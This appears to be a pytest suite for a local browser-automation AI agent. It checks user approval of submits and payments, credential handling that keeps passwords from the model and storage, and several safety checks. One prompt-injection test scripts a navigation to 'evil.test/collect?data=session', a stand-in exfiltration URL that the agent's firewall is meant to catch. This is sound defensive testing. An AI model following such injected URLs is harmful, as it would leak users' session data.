"""End-to-end agent loop tests: real Chromium, real local test sites, the real
loop, firewall, storage and task manager. Only the model is scripted so each
scenario is deterministic."""
import asyncio
import json
import time

import pytest

from karyakarta.ai.client import ModelUnavailableError
from karyakarta.models import AgentAction


async def until(predicate, timeout=40.0):
    deadline = time.monotonic() + timeout
    while time.monotonic() < deadline:
        value = predicate()
        if value:
            return value
        await asyncio.sleep(0.05)
    raise AssertionError("condition not reached in time")


def event_of(db, task_id, kind):
    return next((e for e in db.list_events(task_id) if e["kind"] == kind), None)


async def finished(db, task_id):
    return await until(lambda: (t := db.get_task(task_id)) and t["status"] in ("completed", "failed", "cancelled") and t)


def dump_everything(db, task_id) -> str:
    """All text the app persisted for a task, to prove secrets never land in it."""
    task = db.get_task(task_id)
    return json.dumps([task, db.list_events(task_id), db.list_steps(task_id)])


@pytest.fixture
async def started(make_runner):
    created = []

    async def start(steps):
        runner, manager, model, bus = make_runner(steps)
        await manager.start()
        created.append(manager)
        return manager, model

    yield start
    for manager in created:
        await manager.stop()


CONTACT_STEPS = [
    {"action": "type", "label": "Full name", "value": "Asha Rao"},
    {"action": "type", "label": "Email address", "value": "asha@example.com"},
    {"action": "select", "label": "Topic", "value": "Support"},
    {"action": "click", "label": "I agree"},
    {"action": "click", "label": "Send message"},
]


async def test_form_task_completes_after_the_user_approves_the_submit(started, db, site):
    manager, model = await started(CONTACT_STEPS + [{"action": "done", "value": "Message sent"}])
    task_id = manager.submit("Send a message to the site", f"{site}/contact.html")

    ask = await until(lambda: event_of(db, task_id, "confirmation_request"))
    assert "Send message" in ask["detail"]["action"] and ask["detail"]["category"] == "submit"
    assert db.get_task(task_id)["status"] == "awaiting_user"
    manager.respond_confirmation(task_id, True)

    task = await finished(db, task_id)
    assert task["status"] == "completed" and task["result"] == "Message sent"
    steps = db.list_steps(task_id)
    assert [s["action"] for s in steps] == ["type", "type", "select", "click", "click", "done"]
    assert all(s["ok"] for s in steps)
    assert all(s["screenshot"] for s in steps if s["action"] != "done" or True)
    thought = event_of(db, task_id, "thought")
    assert thought["detail"]["screenshot"].endswith(".jpg") and thought["detail"]["url"].endswith("contact.html")
    kinds = [e["kind"] for e in db.list_events(task_id)]
    assert {"task_started", "observe", "thought", "policy", "action", "step_result", "confirmation_request", "task_complete"} <= set(kinds)


async def test_declining_a_risky_action_blocks_it_and_two_declines_stop_the_task(started, db, site):
    manager, _ = await started([{"action": "click", "label": "Send message"}] * 4)
    task_id = manager.submit("Send it", f"{site}/contact.html")
    for _ in range(2):
        await until(lambda: db.get_task(task_id)["status"] == "awaiting_user")
        manager.respond_confirmation(task_id, False)
        await asyncio.sleep(0.2)
    task = await finished(db, task_id)
    assert task["status"] == "failed" and "declined" in task["error"]


async def test_login_password_is_entered_by_the_user_and_never_stored(started, db, site):
    steps = [
        {"action": "type", "label": "Email", "value": "demo@example.com"},
        {"action": "type", "label": "Password", "value": "hunter2-hallucinated"},  # model must not be able to choose this
        {"action": "click", "label": "Sign in"},
        {"action": "done", "value": "Logged in"},
    ]
    manager, model = await started(steps)
    task_id = manager.submit("Log in to the demo site", f"{site}/login.html")

    ask = await until(lambda: event_of(db, task_id, "credential_request"))
    assert ask["detail"]["kind"] == "password"
    manager.respond_credential(task_id, "secret123")
    task = await finished(db, task_id)

    assert task["status"] == "completed"
    everything = dump_everything(db, task_id)
    assert "secret123" not in everything and "hunter2-hallucinated" not in everything
    assert not any("secret123" in p for p in model.prompts), "the model must never see the password"
    assert "(secret field)" in model.prompts[1] and "enter" in everything.lower()
    # the page itself proves the right credentials were typed
    # (checked via the stored step: the login submit was allowed without a second prompt)
    assert event_of(db, task_id, "confirmation_request") is None


async def test_card_fields_always_need_the_user(started, db, site):
    manager, model = await started([{"action": "type", "label": "Card number", "value": "4111111111111111"}, {"action": "fail", "value": "stop"}])
    task_id = manager.submit("Pay for the lamp", f"{site}/checkout.html")
    ask = await until(lambda: event_of(db, task_id, "credential_request"))
    assert ask["detail"]["kind"] == "payment"
    manager.respond_credential(task_id, "4242424242424242")
    await finished(db, task_id)
    assert "4242424242424242" not in dump_everything(db, task_id) and "4111111111111111" not in dump_everything(db, task_id)


async def test_pay_button_asks_even_though_the_model_labelled_nothing_risky(started, db, site):
    manager, _ = await started([{"action": "click", "label": "Pay now"}, {"action": "fail", "value": "stop"}])
    task_id = manager.submit("Pay", f"{site}/checkout.html")
    ask = await until(lambda: event_of(db, task_id, "confirmation_request"))
    assert ask["detail"]["category"] == "submit"
    manager.respond_confirmation(task_id, False)
    await finished(db, task_id)
    assert not await_page_text_contains_payment(db, task_id)


def await_page_text_contains_payment(db, task_id) -> bool:
    return any("Payment received" in (s["summary"] or "") for s in db.list_steps(task_id))


async def test_hallucinated_element_numbers_are_rejected_and_the_agent_recovers(started, db, site):
    manager, model = await started([
        {"action": "click", "mark": 99},
        {"action": "type", "label": "Full name", "value": "Asha"},
        {"action": "done", "value": "ok"},
    ])
    task_id = manager.submit("Fill the name", f"{site}/contact.html")
    task = await finished(db, task_id)
    assert task["status"] == "completed"
    steps = db.list_steps(task_id)
    assert "rejected" in steps[0]["summary"] and not steps[0]["ok"]
    assert "rejected: Element [99] does not exist" in model.prompts[1]  # the reason is fed back to the model


async def test_injected_page_instructions_are_removed_and_leaving_the_site_needs_approval(started, db, site):
    manager, model = await started([
        {"action": "navigate", "value": "http://evil.test/collect?data=session"},
        {"action": "fail", "value": "stop"},
    ])
    task_id = manager.submit("Add the lamp to the cart", f"{site}/shop.html")
    ask = await until(lambda: event_of(db, task_id, "confirmation_request"))
    assert ask["detail"]["category"] == "injection"
    assert event_of(db, task_id, "warning") is not None
    assert "evil.test" not in model.prompts[0] and "removed suspicious" in model.prompts[0]
    manager.respond_confirmation(task_id, False)
    await finished(db, task_id)


async def test_navigating_to_the_agents_own_control_port_is_blocked_outright(started, db, site, settings):
    url = f"http://127.0.0.1:{settings.port}/api/tasks"
    manager, _ = await started([{"action": "navigate", "value": url}, {"action": "fail", "value": "stop"}])
    task_id = manager.submit("Open the control panel", f"{site}/index.html")
    await finished(db, task_id)
    assert event_of(db, task_id, "confirmation_request") is None
    assert any("control service" in e["message"] for e in db.list_events(task_id))


async def test_repeating_actions_with_no_effect_stops_the_task_with_a_clear_reason(started, db, site):
    manager, model = await started([{"action": "scroll", "value": "up"}] * 12)
    task_id = manager.submit("Do something", f"{site}/index.html")
    task = await finished(db, task_id)
    assert task["status"] == "failed" and "without making progress" in task["error"]
    assert any("Do not repeat them" in p for p in model.prompts)


async def test_done_right_after_a_failed_action_is_challenged_once(started, db, site):
    manager, model = await started([
        {"action": "click", "mark": 1},  # a link is fine; follow it
        {"action": "scroll", "value": "up"},  # fails: already at top
        {"action": "done", "value": "finished"},
        {"action": "done", "value": "finished"},
    ])
    task_id = manager.submit("Anything", f"{site}/index.html")
    task = await finished(db, task_id)
    assert task["status"] == "completed"
    assert any("last action failed" in p for p in model.prompts)


async def test_asking_the_user_a_question_waits_for_the_answer(started, db, site):
    manager, model = await started([
        {"action": "ask_user", "value": "Which topic should I choose?"},
        {"action": "select", "label": "Topic", "value": "Sales"},
        {"action": "done", "value": "ok"},
    ])
    task_id = manager.submit("Pick a topic", f"{site}/contact.html")
    q = await until(lambda: event_of(db, task_id, "question"))
    assert q["message"] == "Which topic should I choose?"
    manager.respond_answer(task_id, "Sales please")
    await finished(db, task_id)
    assert any("USER ANSWERS: Sales please" in p for p in model.prompts)


async def test_the_model_cannot_ask_for_a_password_in_chat(started, db, site):
    manager, model = await started([{"action": "ask_user", "value": "What is your password?"}, {"action": "fail", "value": "stop"}])
    task_id = manager.submit("Log in", f"{site}/login.html")
    await finished(db, task_id)
    assert event_of(db, task_id, "question") is None
    assert any("Never ask the user to type a password" in p for p in model.prompts)


async def test_cancelling_while_waiting_for_the_user_stops_cleanly(started, db, site):
    manager, _ = await started([{"action": "click", "label": "Send message"}])
    task_id = manager.submit("Send it", f"{site}/contact.html")
    await until(lambda: event_of(db, task_id, "confirmation_request"))
    assert manager.cancel(task_id)
    task = await finished(db, task_id)
    assert task["status"] == "cancelled"


async def test_a_queued_task_can_be_cancelled_before_it_starts(started, db, site):
    manager, _ = await started([{"action": "click", "label": "Send message"}])
    first = manager.submit("first", f"{site}/contact.html")
    second = manager.submit("second", f"{site}/index.html")
    await until(lambda: event_of(db, first, "confirmation_request"))
    assert manager.cancel(second)
    assert db.get_task(second)["status"] == "cancelled"
    manager.cancel(first)
    await finished(db, first)


async def test_answers_to_nothing_are_refused(started, db, site):
    from karyakarta.agent.manager import NoPendingRequest

    manager, _ = await started([{"action": "scroll", "value": "down"}] * 3)
    task_id = manager.submit("x", f"{site}/index.html")
    with pytest.raises(NoPendingRequest):
        manager.respond_credential(task_id, "nope")
    manager.cancel(task_id)
    await finished(db, task_id)


async def test_engine_down_fails_loudly_with_the_real_reason(make_runner, db, site):
    runner, manager, model, _ = make_runner([])

    async def broken(*a, **k):
        raise ModelUnavailableError("The local AI engine is not running. Start Ollama and try again.")

    model.chat_json = broken
    await manager.start()
    try:
        task_id = manager.submit("anything", f"{site}/index.html")
        task = await finished(db, task_id)
        assert task["status"] == "failed" and "not running" in task["error"]
    finally:
        await manager.stop()


async def test_step_limit_is_reported(started, db, site, settings):
    manager, _ = await started([{"action": "scroll", "value": "down"}, {"action": "scroll", "value": "up"}] * 10)
    task_id = manager.submit("loop", f"{site}/long.html")
    task = await finished(db, task_id)
    assert task["status"] == "failed"
    assert "step limit" in task["error"] or "without making progress" in task["error"]


async def test_bad_start_address_fails_with_plain_words(started, db):
    manager, _ = await started([])
    task_id = manager.submit("open it", "http://no-such-host.invalid/")
    task = await finished(db, task_id)
    assert task["status"] == "failed" and "could not be found" in task["error"]


async def test_restart_marks_unfinished_tasks_failed(db, make_runner):
    stale = db.create_task("old", None, "m")
    db.set_status(stale, "running")
    runner, manager, _, _ = make_runner([])
    await manager.start()
    try:
        assert db.get_task(stale)["status"] == "failed"
    finally:
        await manager.stop()
